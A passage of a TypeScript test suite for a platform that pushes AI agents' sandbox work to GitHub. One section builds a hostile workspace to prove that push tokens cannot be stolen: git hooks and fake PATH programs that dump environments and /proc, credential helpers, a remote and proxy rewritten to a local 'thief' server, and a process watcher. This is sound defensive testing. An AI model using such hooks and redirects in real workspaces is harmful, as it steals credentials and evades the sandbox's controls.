		appRead?.message,
	);

	// The pull request permission is missing: the push goes through, the pull request does not.
	const noPulls = await prepared("nopulls", adaConnection, quay, acme);
	standin.appPermissions = { metadata: "read", contents: "write" };
	let half: unknown = null;
	try {
		await publish.publishWork(noPulls);
	} catch (error) {
		half = error;
	}
	standin.appPermissions = { metadata: "read", contents: "write", pull_requests: "write" };
	expect(
		"pushed, but no pull request: the commit at GitHub is reported so the next try only opens it",
		half instanceof publish.PullProblem && half.head === standin.branchHead(quay, noPulls.branch) && half.head !== null,
		half instanceof Error ? half.message : "",
	);
	const retried = await publish.publishWork({
		...noPulls,
		pushed: half instanceof publish.PullProblem ? half.head : null,
	});
	expect("the next try opens it without pushing again", retried.opened && retried.pull.branch === noPulls.branch);

	// A protected branch.
	const guarded = await prepared("guarded", adaConnection, quay, acme);
	standin.protect(quay, ["windlass/*"]);
	const refused = await problem(() => publish.publishWork(guarded));
	standin.protect(quay, []);
	expect(
		"the branch is protected",
		refused?.code === "github_denied" &&
			refused.message ===
				"GitHub refused the push: a rule of acme/quay protects branches named like windlass/guarded-000000. Let the GitHub App create such branches in the repository's branch rules, then push again.",
		refused?.message,
	);
	expect("and nothing arrived at GitHub", standin.branchHead(quay, guarded.branch) === null);
	const allowed = await publish.publishWork(guarded);
	expect("once the rule is changed the same push goes through", allowed.opened);

	// The branch moved at GitHub.
	const behind = await prepared("behind", adaConnection, quay, acme);
	const pushedOnce = await publish.publishWork(behind);
	standin.commit(quay, behind.branch, { "theirs.txt": "from elsewhere\n" }, "Someone else's commit");
	writeFileSync(join(behind.sandbox.cwd, "work.txt"), "more\n");
	const diverged = await problem(() =>
		publish.publishWork({ ...behind, pull: pushedOnce.pull, pushed: pushedOnce.head }),
	);
	expect(
		"the branch at GitHub has commits the workspace lacks: refused, not overwritten",
		diverged?.message.startsWith(
			`The branch ${behind.branch} at GitHub has commits this workspace does not have, so the push was refused rather than overwrite them.`,
		) === true && standin.fileOn(quay, behind.branch, "theirs.txt") === "from elsewhere\n",
		diverged?.message,
	);

	// The repository is gone.
	const doomed = standin.addRepository({ owner: "acme", name: "doomed", private: true, installation: acme });
	doomed.access.set("ada", "write");
	repos.forgetGithubCaches();
	const lost = await prepared("lost", adaConnection, doomed, acme);
	standin.deleteRepository(doomed);
	const cachedGone = await problem(() => publish.publishWork(lost));
	expect(
		"the repository is gone",
		cachedGone?.code === "github_gone" &&
			cachedGone.message ===
				"acme/doomed is no longer on GitHub, or the GitHub App can no longer see it. Check that the repository exists and that the app's installation on acme still includes it.",
		cachedGone?.message,
	);
	repos.forgetGithubCaches();
	const freshGone = await problem(() => publish.publishWork(lost));
	expect(
		"and when the server has heard of it: it is not among the connection's repositories",
		freshGone?.code === "github_gone",
		freshGone?.message,
	);

	// The connection was removed, by the user or because the app was uninstalled.
	const orphan = await prepared("orphan", adaConnection, harbor, adaInstallation);
	const disconnected = await problem(() => publish.publishWork({ ...orphan, connection: null }));
	expect(
		"the connection was removed",
		disconnected?.code === "github_gone" &&
			disconnected.message ===
				"GitHub is not connected any more. Connect GitHub again in Settings, then try once more.",
		disconnected?.message,
	);
	const temporary = standin.addInstallation("eve", "User");
	const eve = standin.addUser("eve");
	temporary.account.id = eve.id;
	const eves = standin.addRepository({ owner: "eve", name: "attic", private: true, installation: temporary });
	const eveConnection = connectionOf(eve, [temporary]);
	const attic = await prepared("attic", eveConnection, eves, temporary);
	standin.uninstall(temporary);
	repos.forgetGithubCaches();
	const uninstalled = await problem(() => publish.publishWork(attic));
	expect(
		"the app was uninstalled from the account",
		uninstalled?.code === "github_gone" &&
			uninstalled.message ===
				"The GitHub App is no longer installed on eve. Connect GitHub again and install it there, then try once more.",
		uninstalled?.message,
	);

	// GitHub cannot be reached.
	const offline = await prepared("offline", adaConnection, harbor, adaInstallation);
	repos.forgetGithubCaches();
	standin.down = true;
	const down = await problem(() => publish.publishWork(offline));
	standin.down = false;
	expect(
		"GitHub cannot be reached",
		down?.code === "github_unreachable" && down.message === "GitHub could not be reached. Try again in a moment.",
		down?.message,
	);

	// Nothing to push at all.
	const idle = localSandbox("idle");
	await publish.cloneRepository(app, adaConnection, stored(harbor, adaInstallation), idle);
	const empty = await problem(() =>
		publish.publishWork({
			evidence: NOTHING_VERIFIED,
			app,
			connection: adaConnection,
			repository: stored(harbor, adaInstallation),
			sandbox: idle,
			sessionId: "s_idle",
			branch: "windlass/idle-000000",
			pull: null,
			pushed: null,
			message,
		}),
	);
	expect(
		"nothing to open a pull request with",
		empty?.message ===
			"There is nothing to open a pull request with: the workspace has no changes and no commit that main does not have.",
		empty?.message,
	);
});

// ---------------------------------------------------------------------------------------------
// A workspace that tries to catch the token
// ---------------------------------------------------------------------------------------------

await section("hostile: a workspace set up to catch the token catches nothing", async () => {
	// Somewhere the token must never arrive: a second server that keeps every request's headers.
	const caught: string[] = [];
	const thief = createServer((request: IncomingMessage, response) => {
		caught.push(`${request.method} ${request.url} ${JSON.stringify(request.headers)}`);
		response.writeHead(401, { "www-authenticate": 'Basic realm="thief"' });
		response.end();
	});
	await new Promise<void>(resolve => thief.listen(0, "127.0.0.1", resolve));
	const thiefUrl = `http://127.0.0.1:${(thief.address() as AddressInfo).port}`;

	const sandbox = localSandbox("hostile");
	const repository = stored(harbor, adaInstallation);
	await publish.cloneRepository(app, adaConnection, repository, sandbox);
	const loot = join(sandbox.home, "loot");
	mkdirSync(loot);
	// What an agent can do to its own workspace: hooks, a remote rewritten to another host, credential helpers, a watcher.
	const grab = (name: string) =>
		`#!/bin/sh\n{ echo "== ${name} $*"; env; cat <&3 2>/dev/null; cat 2>/dev/null; for pid in /proc/[0-9]*; do tr '\\0' '\\n' < $pid/environ 2>/dev/null; tr '\\0' ' ' < $pid/cmdline 2>/dev/null; done; } >> ${loot}/${name} 2>/dev/null\nexit 0\n`;
	for (const hook of [
		"pre-commit",
		"commit-msg",
		"post-commit",
		"pre-push",
		"reference-transaction",
		"post-checkout",
	]) {
		writeFileSync(join(sandbox.cwd, ".git/hooks", hook), grab(hook));
		chmodSync(join(sandbox.cwd, ".git/hooks", hook), 0o755);
	}
	const helper = join(sandbox.home, "helper.sh");
	writeFileSync(helper, `#!/bin/sh\n{ echo "== helper $*"; cat; env; } >> ${loot}/helper\n`);
	chmodSync(helper, 0o755);
	const hostile = [
		`[url "${thiefUrl}/"]\n\tinsteadOf = ${standin.url}/\n\tpushInsteadOf = ${standin.url}/`,
		`[credential]\n\thelper = ${helper}\n\thelper = store --file=${loot}/stored`,
		`[http]\n\tproxy = ${thiefUrl}\n\textraHeader = X-Leak: yes`,
		`[core]\n\thooksPath = ${join(sandbox.cwd, ".git/hooks")}\n\tfsmonitor = ${helper}\n\taskPass = ${helper}\n\tsshCommand = ${helper}`,
		`[remote "origin"]\n\tpushurl = ${thiefUrl}/ada/harbor.git`,
	].join("\n");
	const ownConfig = readFileSync(join(sandbox.cwd, ".git/config"), "utf8");
	writeFileSync(join(sandbox.cwd, ".git/config"), `${ownConfig}\n${hostile}\n`);
	writeFileSync(
		join(sandbox.home, ".gitconfig"),
		`${readFileSync(join(sandbox.home, ".gitconfig"), "utf8")}\n${hostile}\n`,
	);
	// Programs of the agent's own before the system's in PATH, each of which keeps what it is given.
	const bin = join(sandbox.home, "bin");
	mkdirSync(bin);
	for (const name of ["env", "mktemp", "cat", "printf", "rm"]) {
		writeFileSync(
			join(bin, name),
			`#!/bin/sh\n{ echo "== fake ${name} $*"; /usr/bin/env; /usr/bin/timeout 1 /usr/bin/cat; } >> ${loot}/path-${name} 2>/dev/null\nexec /usr/bin/${name} "$@"\n`,
		);
		chmodSync(join(bin, name), 0o755);
	}
	sandbox.env.PATH = `${bin}:${sandbox.env.PATH}`;
	// And something left running that looks at every process's arguments and environment, as the same user.
	const watcher: ChildProcess = spawn(
		"bash",
		[
			"-c",
			`while :; do for pid in /proc/[0-9]*; do { tr '\\0' '\\n' < $pid/environ; tr '\\0' ' ' < $pid/cmdline; } 2>/dev/null; done >> ${loot}/watcher; done`,
		],
		{ stdio: "ignore" },
	);

	writeFileSync(join(sandbox.cwd, "work.txt"), "hostile\n");
	const branch = "windlass/hostile-000000";
	// With all of it in the workspace's own configuration, the platform's git does not run there at all (git.ts `wlp_guard`).
	const refusedFrom = standin.minted.length;
	const refusedHostile = await problem(() =>
		publish.publishWork({
			evidence: NOTHING_VERIFIED,
			app,
			connection: adaConnection,
			repository,
			sandbox,
			sessionId: "s_hostile",
			branch,
			pull: null,
			pushed: null,
			message: { title: "Pushed from a hostile workspace", body: "" },
		}),
	);
	expect(
		"with the workspace's own configuration hostile, the publish is refused before any git of the platform's runs: no push token is asked for, the other server is not asked",
		refusedHostile?.message.startsWith(
			"The workspace's git settings were changed in a way the platform does not run",
		) === true &&
			!mintedSince(refusedFrom).some(entry => entry.includes("contents:write")) &&
			caught.length === 0 &&
			standin.branchHead(harbor, branch) === null,
		refusedHostile?.message.slice(0, 160),
	);
	// The home directory's configuration stays hostile: the platform's git reads none but the repository's own.
	writeFileSync(join(sandbox.cwd, ".git/config"), ownConfig);
	const from = standin.minted.length;
	let outcome: Awaited<ReturnType<typeof publish.publishWork>> | null = null;
	try {
		outcome = await publish.publishWork({
			evidence: NOTHING_VERIFIED,
			app,
			connection: adaConnection,
			repository,
			sandbox,
			sessionId: "s_hostile",
			branch,
			pull: null,
			pushed: null,
			message: { title: "Pushed from a hostile workspace", body: "" },
		});
	} finally {
		watcher.kill("SIGKILL");
		await new Promise(resolve => setTimeout(resolve, 200));
	}
	const tokens = tokensSince(from);
	const pushToken = standin.minted.slice(from).find(entry => entry.permissions?.contents === "write")?.token ?? "";
	expect(
		"the push still arrives where it should",
		outcome !== null && outcome.opened && standin.fileOn(harbor, branch, "work.txt") === "hostile\n",
	);
	expect(
		"the other server was never asked: the rewritten address and the proxy were not used",
		caught.length === 0,
		caught.slice(0, 2).join(" | "),
	);
	const taken = readdirSync(loot);
	const holding = filesHolding(loot, pushToken).concat(tokens.flatMap(token => filesHolding(loot, token)));
	const encoded = Buffer.from(`x-access-token:${pushToken}`, "utf8").toString("base64");
	expect(
		"neither the hooks, the helpers, the programs in PATH nor the watcher saw the token",
		pushToken !== "" && holding.length === 0 && filesHolding(loot, encoded).length === 0,
		`they wrote ${taken.length} files (${taken.join(", ")}); ${holding.length} hold a token`,
	);
	// That it looked at all: the push is quick now that no hostile configuration of the home directory is read, and a sample may miss its git.
	expect(
		"the watcher did look at processes while the push ran",
		taken.includes("watcher") && readFileSync(join(loot, "watcher"), "utf8").length > 0,
		"it recorded processes' command lines",
	);
	expect(
		"the hooks of the token's git did not run: no pre-push",
		!taken.includes("pre-push") && !taken.includes("reference-transaction-token"),
		taken.join(", "),
	);
	expect(
		"the platform's commit ran none of the workspace's hooks either",
		!taken.includes("pre-commit") && !taken.includes("commit-msg"),
		taken.join(", "),
	);
	expect("the token is revoked", !standin.alive(pushToken));
	await new Promise<void>(resolve => thief.close(() => resolve()));
});

// ---------------------------------------------------------------------------------------------
// In the sandbox image
// ---------------------------------------------------------------------------------------------

await section("docker: the same git commands in a container of the sandbox image", async () => {
	if (!DOCKER) {
		tally.skips += 1;
		console.log("SKIP  not asked for (--docker)");
		return;
	}
	const name = `wlp-github-check-${randomBytes(4).toString("hex")}`;
	const docker = (args: string[], input?: string) =>
		execFileSync("docker", args, { encoding: "utf8", input, stdio: ["pipe", "pipe", "pipe"] });
	// On the host's network, so that git inside reaches the stand-in on this machine's loopback address: a
	// host's firewall often stands between a container's own network and a port of the host's.
	docker([
		"run",
		"-d",
		"--rm",
		"--name",
		name,
		"--label",
		"dev.windlass-platform=1",
		"--network",
		"host",
		"--cap-drop",
		"ALL",
		"--security-opt",
		"no-new-privileges",
		await imageId(),
		"sleep",
		"600",
	]);
	try {
		const inside = app;
		const handle = new (class extends DockerSandboxHandle {
			override get container() {
				return name;
			}
		})(name, "docker-hardened", "fixture");
		const stdins: string[] = [];
		let protectedPush = false;
		const sandbox: SandboxHandle = {
			id: name,
			cwd: "/workspace",
			profile: "docker-hardened",
			async run(command, options = {}) {
				if (options.stdin) stdins.push(options.stdin);
				if (command.includes("push --porcelain")) {
					expect("the authenticated push requires the transport uid", options.gitUser === true);
					if (!options.gitUser) throw new Error("missing transport uid");
					// Inert sentinels in the workspace user's exchange directory. The transport
					// repository must remain inaccessible from that same container and mount namespace.
					const privateDir = command.match(/private='(\/tmp\/wlp-transport-[a-f0-9]{32})'/)?.[1];
					if (!privateDir) throw new Error("missing transport directory");
					const exchange = privateDir.replace("wlp-transport-", "wlp-git-attempt-");
					const checked = docker([
						"exec",
						name,
						"sh",
						"-ec",
						[
							'test "$(stat -c %u:%a "$1")" = 65534:700',
							'test ! -w "$1/repo/config"',
							'test ! -r "$1/patch"',
							'git rev-parse HEAD > "$2/head"',
							'git config --file "$2/repo/config" http.proxy http://invalid.invalid',
							"echo isolated",
						].join("\n"),
						"fixture",
						privateDir,
						exchange,
					]);
					protectedPush = checked.trim() === "isolated";
				}
				return handle.run(command, options);
			},
			readTextFile: async () => "",
			writeTextFile: async () => undefined,
		};
		const identity = await handle.run(
			'id -u; pwd; test -z "${GIT_CONFIG_COUNT-}${GIT_SSH_COMMAND-}${SSL_CERT_FILE-}${LD_LIBRARY_PATH-}"',
			{
				gitUser: true,
				cwd: "/workspace",
				env: {
					GIT_CONFIG_COUNT: "7",
					GIT_SSH_COMMAND: "fixture",
					SSL_CERT_FILE: "/fixture",
					LD_LIBRARY_PATH: "/fixture",
				},
			},
		);
		expect(
			"the transport starts as uid 65534 outside the workspace with inherited overrides removed",
			identity.exitCode === 0 && identity.stdout === "65534\n/\n",
		);
		const version = await sandbox.run("git --version; id -un; git init --quiet . && echo ready");
		expect(
			"the container is the sandbox image's: its git, its user",
			version.stdout.includes("git version") && version.stdout.includes("agent") && version.stdout.includes("ready"),
			version.stdout.trim().replace(/\n/g, ", "),
		);
		// A watcher inside the container, as the agent's user: every process's arguments and environment, over and over.
		docker([
			"exec",
			"-d",
			name,
			"bash",
			"-c",
			"echo $$ > /home/agent/watcher.pid; while :; do for pid in /proc/[0-9]*; do { tr '\\0' '\\n' < $pid/environ; tr '\\0' ' ' < $pid/cmdline; echo; } 2>/dev/null; done >> /home/agent/watcher.log; done",
		]);
		const repository = stored(harbor, adaInstallation);
		const from = standin.minted.length;
		const cloned = await publish.cloneRepository(inside, adaConnection, repository, sandbox);
		const listing = await sandbox.run("ls; git log --oneline | head -1; cat .git/config");
		expect(
			"the private repository is cloned inside the container",
			cloned && listing.stdout.includes("README.md") && listing.stdout.includes(`url = ${standin.url}/ada/harbor.git`),
			listing.stdout.split("\n").slice(0, 4).join(", "),
		);
		await sandbox.run("echo container >> CHANGES.md");
		const branch = "windlass/container-000000";
		const published = await publish.publishWork({
			evidence: NOTHING_VERIFIED,
			app: inside,
			connection: adaConnection,
			repository,
			sandbox,
			sessionId: "s_container",
			branch,
			pull: null,
			pushed: null,
			message: { title: "Pushed from the sandbox image", body: "" },
		});
		expect(
			"and the work is pushed from it and the pull request opened",
			protectedPush &&
				published.opened &&
				published.head === standin.branchHead(harbor, branch) &&
				standin.fileOn(harbor, branch, "CHANGES.md")?.includes("container") === true,
		);
		const tokens = tokensSince(from);
		const used = tokens.filter(token => stdins.includes(`${token}\n`));
		const search = await sandbox.run(
			"kill $(cat /home/agent/watcher.pid); sleep 0.3; wc -c < /home/agent/watcher.log; grep -c 'git-remote-http' /home/agent/watcher.log; ls /tmp; echo searched",
		);
		const grep = docker(
			[
				"exec",
				"-i",
				name,
				"bash",
				"-c",
				`while IFS= read -r t; do grep -r -l -F -- "$t" /workspace /home/agent /tmp 2>/dev/null; done; echo searched`,
			],
			`${tokens.join("\n")}\n`,
		);
		expect(
			"two tokens went into the container, on standard input",
			used.length === 2,
			`${used.length} of ${tokens.length} issued`,
		);
		expect(
			"no file in the workspace, the home directory or /tmp holds one, and the watcher saw none in any process's arguments or environment",
			grep.trim() === "searched" &&
				search.stdout.includes("searched") &&
				/^[1-9]\d{3,}\n[1-9]/.test(search.stdout.trim()),
			`the watcher recorded ${search.stdout.trim().split("\n")[0]} bytes and saw git's own processes ${search.stdout.trim().split("\n")[1]} times; files holding a token: ${grep.trim() === "searched" ? "none" : grep.trim()}`,
		);
		expect(
			"nothing of the push is left in /tmp",
			!/wlp-push|wlp-publish|wlp-message|wlp-git[.-]|wlp-transport-/.test(search.stdout),
		);
		const arguments_ = execFileSync("ps", ["-eo", "args"], { encoding: "utf8" });
		expect(
			"and the server's own process list never had one either",
			tokens.every(token => !arguments_.includes(token)),
		);
		const reviewDir = "/tmp/reviewer-workspace";
		await sandbox.run(`mkdir -p ${reviewDir}`);
		await verifyReviewCheckout({
			...sandbox,
			cwd: reviewDir,
			run: (command, options) => sandbox.run(command, { cwd: reviewDir, ...options }),
		});
	} finally {
		try {
			docker(["rm", "-f", name]);
		} catch {
			// Removed already.
		}
	}
});

await section("mirror units: failure labels, deployment scope and module imports", async () => {
	// Only a failure of the mirror's own makes a second, plain clone. Any other is reported as it is.
	const owner = "a".repeat(64);
	const failure = async (result: Partial<ExecResult>, reference = true) => {
		const fake: SandboxHandle = {
			id: "fake",
			profile: "docker-hardened",
			cwd: "/workspace",
			run: async (command, options) => ({
				exitCode: options?.gitUser && command.includes(" clone ") ? 1 : 0,
				timedOut: false,
				aborted: false,
				stdout: "",
				stderr: "",
				...(options?.gitUser && command.includes(" clone ") ? result : {}),
			}),
			readTextFile: async () => "",
			writeTextFile: async () => {},
		};
		return (
			await gitSteps.cloneWithToken(fake, "t", {
				url: "https://github.com/ada/r.git",
				branch: "main",
				directory: "r",
				mirror: { owner, reference },
			})
		).failure;
	};
	assert.equal(await failure({ stderr: "fatal: Remote branch main not found in upstream origin" }), "no_branch");
	assert.equal(
		await failure({
			stderr: "remote: Repository not found.\nfatal: repository 'https://github.com/ada/r.git/' not found",
		}),
		"gone",
	);
	assert.equal(await failure({ stderr: "fatal: Authentication failed for 'https://github.com/ada/r.git/'" }), "denied");
	assert.equal(await failure({ exitCode: null, timedOut: true }), "timeout");
	assert.equal(await failure({ stderr: "fatal: the remote end hung up unexpectedly" }), "other");
	assert.equal(await failure({ exitCode: 4, stdout: "wlp:mirrorfail\n" }), "mirror");
	assert.equal(
		await failure({
			stdout: "wlp:mirrorfail\n",
			stderr: "error: RPC failed; curl 28 Operation too slow. Less than 1 bytes/sec transferred the last 8 seconds",
		}),
		"mirror",
	);
	assert.equal(await failure({ exitCode: 4, stdout: "wlp:mirrorfail\n" }, false), "other");
	expect(
		"a reference clone is relabelled only for the mirror's lock, config, alternates, connectivity or stall failures",
		true,
	);
	// Snapshots are off here (WLP_SNAPSHOTS unset): no snapshot identity, but mirrors still scoped,
	// also on the next start, when the mirror's identity exists already.
	// The configuration was read before this script set its storage path: give the layer a fresh one.
	const { config } = await import("../server/src/config.js");
	const storagePath = config.storagePath;
	(config as { storagePath: string }).storagePath = join(scratch, "layer-state");
	try {
		const { createSandboxLayer } = await import("../server/src/sandbox/index.js");
		const scopes = [createSandboxLayer(), createSandboxLayer()].map(
			l => (l.sandboxes as unknown as { options: { deployment?: string; mirrorScope?: string } }).options,
		);
		assert.equal(config.snapshots, false);
		assert.deepEqual(
			scopes.map(o => o.deployment),
			[undefined, undefined],
			"a deployment without snapshots got a snapshot identity",
		);
		assert.ok(!existsSync(join(config.storagePath, "snapshot-deployment")), "the snapshot identity was created");
		assert.match(scopes[0]!.mirrorScope ?? "", /^[0-9a-f]{32}$/);
		assert.equal(scopes[1]!.mirrorScope, scopes[0]!.mirrorScope);
		const layer = createSandboxLayer();
		let asked = 0;
		await layer.sandboxes.sweepSnapshots?.(async () => {
			asked++;
			return null;
		});
		await layer.sandboxes.dropSnapshots?.("fixtureA");
		assert.equal(asked, 0);
	} finally {
		(config as { storagePath: string }).storagePath = storagePath;
	}
	expect("snapshot sweeps stay off where snapshots are, while mirrors keep a deployment scope", true);
	const source = (path: string) => readFileSync(new URL(path, import.meta.url), "utf8");
	assert.ok(
		!/^\s*(?:import|export\s.*\sfrom)\b/m.test(source("../server/src/sandbox/store-limits.ts")),
		"store-limits.ts imports something",
	);
	assert.ok(
		!source("../server/src/sandbox/git-mirrors.ts").includes('"./snapshots.js"'),
		"git-mirrors.ts imports snapshots.ts",
	);
	expect("the mirror and snapshot stores share their limits from a module that imports nothing", true);
	// v1 slots came from the earlier design and were never rehashed by the save helper.
	expect("mirrors live in the v2 store, never the v1 one", MIRROR_VOLUME === "wlp-git-mirrors-v2");
});

// One throwaway store, fixture repository and set of containers per mirror section.
async function mirrorFixture(name: string) {
	const volume = "mirror-proof-" + randomBytes(8).toString("hex");
	const image = await imageId();
	const fixture = standin.addRepository({ owner: "ada", name, private: true, installation: adaInstallation });
	repos.forgetGithubCaches();
	const repo = String(fixture.id);
	const store = { volume, slots: 2, graceSeconds: 0 };
	const boxes: string[] = [],
		allocations: number[] = [];
	const cli = async (...args: string[]) => (await dockerCli(args, { check: true })).stdout.trim();
	const pathOf = (user: string) => MIRROR_ROOT + "/" + mirrorOwner(user, repo);
	async function mount(user: string, deployment = "proof", machine = "", options: MirrorStore = {}) {
		const start = performance.now();
		const m = await gitMirrorMount(image, deployment, machine, user, repo, { ...store, ...options });
		allocations.push(Math.round(performance.now() - start));
		return m;
	}
	async function admitted(...args: Parameters<typeof mount>) {
		const m = await mount(...args);
		assert.ok(m, "allocator refused a fixture slot");
		return m;
	}
	// Not --rm: a stopped container keeps naming its slot.
	async function box(user: string, mounted?: string | null, from = image) {
		const name = volume + "-" + boxes.length;
		boxes.push(name);
		// The keepalive a session has, so the per-turn process sweep accepts the container.
		await cli(
			"run",
			"-d",
			"--init",
			"--pull",
			"never",
			"--name",
			name,
			"--network",
			"host",
			"--user",
			"agent",
			"--cpus",
			"1",
			"--cap-drop",
			"ALL",
			"--security-opt",
			"no-new-privileges",
			...(mounted ? ["--mount", mounted] : []),
			from,
			"sleep",
			"infinity",
		);
		return new (class extends DockerSandboxHandle {
			override get container() {
				return name;
			}
		})(name, "docker-hardened", user, undefined, false, image);
	}
	// What only root can see: the store itself. The first line is the script's.
	async function inStore(script: string) {
		const result = await dockerCli([
			"run",
			"--rm",
			"--pull",
			"never",
			"--network",
			"none",
			"--user",
			"0:0",
			"--mount",
			`type=volume,src=${volume},dst=/store`,
			"--entrypoint",
			"/bin/sh",
			image,
			"-c",
			"cd /store; " + script + "; echo; ls -l --time-style=full-iso",
		]);
		return result.stdout.split("\n")[0]!.trim() || result.stdout;
	}
	const slotOf = (user: string, deployment = "proof", machine = "") => mirrorSlot(deployment, machine, user, repo);
	// A save runs on in a helper container after the clone returns.
	const settled = () => mirrorSavesSettled();
	// What the last clone's probe and script did: `probeMs` is the mirror probe's timeout.
	const seen = { probeMs: 0, staged: false, hideMirror: false };
	async function clone(
		handle: DockerSandboxHandle,
		user?: string,
		remote = fixture,
		pinnedBase?: string,
		settle = true,
	) {
		await cli(
			"exec",
			handle.container,
			"bash",
			"-ec",
			"cd /workspace; find . -mindepth 1 -maxdepth 1 -exec rm -rf -- {} +",
		);
		let hit = false;
		seen.staged = false;
		const sandbox: SandboxHandle = {
			id: handle.id,
			profile: handle.profile,
			cwd: handle.cwd,
			run: async (cmd, opts) => {
				if (cmd.startsWith("mountpoint -q -- ")) {
					seen.probeMs = opts?.timeoutMs ?? 0;
					// A probe that timed out: the clone takes the plain path with the mirror in place.
					if (seen.hideMirror) return { exitCode: null, timedOut: true, aborted: false, stdout: "", stderr: "" };
				}
				const result = await handle.run(cmd, opts);
				const marks = gitSteps.markers(result.stdout);
				if (marks.has("mirror")) hit = true;
				if (marks.has("mirrorsave")) seen.staged = true;
				return result;
			},
			readTextFile: handle.readTextFile.bind(handle),
			writeTextFile: handle.writeTextFile.bind(handle),
			saveMirror: handle.saveMirror.bind(handle),
		};
		const start = performance.now(),
			bytes = standin.gitResponseBytes,
			from = standin.minted.length;
		const repository = stored(remote, adaInstallation);
		const result = await publish.cloneRepository(
			app,
			adaConnection,
			repository,
			sandbox,
			undefined,
			undefined,
			pinnedBase,
			user,
		);
		const ms = Math.round(performance.now() - start);
		assert.ok(result);
		assert.equal(repository.baseSha, standin.branchHead(remote, "main"));
		const tokens = standin.minted.slice(from).filter(t => t.permissions?.contents);
		assert.ok(tokens.length > 0);
		assert.ok(
			tokens.every(
				t =>
					!standin.alive(t.token) &&
					t.permissions?.contents === "read" &&
					t.repositoryIds?.join() === String(remote.id),
			),
		);
		await cli(
			"exec",
			handle.container,
			"sh",
			"-ec",
			"test ! -e .git/objects/info/alternates && test ! -e .git/objects/info/http-alternates && git fsck --full --no-dangling",
		);
		if (user && settle) await settled();
		return { ms, bytes: standin.gitResponseBytes - bytes, hit, tokens: tokens.length };
	}
	const mirrorRefs = (handle: DockerSandboxHandle, user: string) =>
		cli(
			"exec",
			"--user",
			"65534",
			handle.container,
			"git",
			"--git-dir",
			pathOf(user) + "/repo.git",
			"for-each-ref",
			"--format=%(refname)",
		);
	async function cleanup() {
		for (const name of boxes) await dockerCli(["rm", "-fv", name]);
		const removed = await dockerCli(["volume", "rm", volume]);
		if (removed.code !== 0 && !/no such volume/i.test(removed.stderr))
			throw new Error("could not remove " + volume + ": " + removed.stderr);
	}
	// The slot's mirror as a session reads it: its directory's inode (a save replaces it) and HEAD.
	const mirrorState = async (handle: DockerSandboxHandle, user: string) =>
		cli(
			"exec",
			"--user",
			"65534",
			handle.container,
			"sh",
			"-ec",
			'stat -c %i "$0/repo.git"; git --git-dir="$0/repo.git" rev-parse HEAD; git --git-dir="$0/repo.git" fsck --full --no-dangling --no-progress',
			pathOf(user),
		);
	return {
		volume,
		image,
		fixture,
		repo,
		store,
		allocations,
		cli,
		pathOf,
		mount,
		admitted,
		box,
		inStore,
		slotOf,
		settled,
		seen,
		clone,
		mirrorRefs,
		mirrorState,
		cleanup,
	};
}

async function mirrorSection(
	name: string,
	repository: string,
	body: (f: Awaited<ReturnType<typeof mirrorFixture>>) => Promise<void>,
	enabled = DOCKER,
) {
	await section(name, async () => {
		if (!enabled) {
			tally.skips++;
			return;
		}
		const f = await mirrorFixture(repository);
		const floor = snapshotLimits.free;
		try {
			await body(f);
		} finally {
			snapshotLimits.free = floor;
			await f.cleanup();
		}
	});
}

await mirrorSection(
	"mirror: Docker scope, authenticated clone and fallback",
	"mirror-proof",
	async ({ cli, admitted, box, clone, pathOf, fixture, inStore, slotOf }) => {
		const uid = "fixtureA",
			other = "fixtureB",
			path = pathOf(uid);
		const a = await box(uid, await admitted(uid)),
			b = await box(other, await admitted(other));
		const plain = await clone(a),
			seed = await clone(a, uid),
			warm = await clone(a, uid);
		assert.ok(!plain.hit && !seed.hit && warm.hit && warm.bytes < plain.bytes);
		console.log("Small fixture clone (ms and HTTP Git bytes)", JSON.stringify({ plain, seed, warm }));
		assert.equal(await cli("exec", "--user", "65534", a.container, "stat", "-c", "%u:%a", path), "65534:700");
		assert.equal(
			await cli("exec", "--user", "65534", a.container, "git", "--git-dir", path + "/repo.git", "rev-parse", "HEAD"),
			standin.branchHead(fixture, "main"),
		);
		assert.equal(
			await cli("exec", "--user", "65534", a.container, "find", path, "!", "-uid", "65534", "-print", "-quit"),
			"",
		);
		assert.equal(
			await cli(
				"exec",
				"--user",
				"65534",
				a.container,
				"git",
				"--git-dir",
				path + "/repo.git",
				"config",
				"--local",
				"--list",
			),
			"core.bare=true\ncore.repositoryformatversion=0",
		);
		assert.notEqual((await dockerCli(["exec", a.container, "touch", path + "/from-agent"])).code, 0);
		assert.notEqual((await dockerCli(["exec", a.container, "cat", path + "/repo.git/config"])).code, 0);
		assert.equal((await clone(a, uid, notes)).hit, false, "a different repository used this slot");
		assert.equal((await clone(b, other)).hit, false);
		assert.equal((await clone(b, uid)).hit, false, "another user's mounted slot was used");
		assert.equal((await clone(b, other)).hit, true);
		standin.commit(fixture, "main", { "moved.txt": "fresh" }, "Advance origin");
		assert.equal((await clone(a, uid)).hit, true);
		assert.equal(await cli("exec", a.container, "cat", "moved.txt"), "fresh");

		standin.hangNextGitRead = true;
		const slow = await clone(a, uid);
		assert.ok(
			!standin.hangNextGitRead && !slow.hit && slow.tokens === 2 && slow.ms < 30_000,
			"stalled reference did not fall back promptly",
		);
		// Only the host can damage a slot now. The plain retry replaces it even with the same refs.
		await inStore(`touch ${slotOf(uid)}/repo.git/objects/info/alternates`);
		const repaired = await clone(a, uid);
		assert.ok(!repaired.hit && repaired.tokens === 2, "bad alternates must fall back under a new token");
		assert.equal((await clone(a, uid)).hit, true, "the plain retry did not repair the mirror");
		await inStore(`rm -rf -- ${slotOf(uid)}/repo.git`);
		await cli("exec", a.container, "git", "fsck", "--full", "--no-dangling");
		assert.equal((await clone(a, uid)).hit, false);
		assert.equal((await clone(a, uid)).hit, true);
		expect("only the selected transport-owned slot is used, a stalled, bad or absent mirror falls back", true);
	},
);

await mirrorSection(
	"mirror: a single-branch review clone",
	"mirror-review",
	async ({ admitted, box, clone, mirrorRefs, fixture }) => {
		const uid = "fixtureA";
		const a = await box(uid, await admitted(uid));
		standin.commit(fixture, "side", { "side.txt": "side" }, "Side branch", "main");
		assert.equal((await clone(a, uid)).hit, false);
		assert.match(await mirrorRefs(a, uid), /refs\/heads\/side/);
		// A review clone fetches one branch. It reads the mirror but must not narrow it.
		assert.equal((await clone(a, uid, fixture, standin.branchHead(fixture, "main")!)).hit, true);
		assert.match(await mirrorRefs(a, uid), /refs\/heads\/side/, "a single-branch clone replaced the full mirror");
		expect("a single-branch review clone uses the mirror and leaves its other branches", true);
	},
);

await mirrorSection(
	"mirror: the free-space floor",
	"mirror-floor",
	async ({ admitted, mount, box, clone, pathOf, inStore, slotOf }) => {
		const uid = "fixtureA",
			other = "fixtureB";
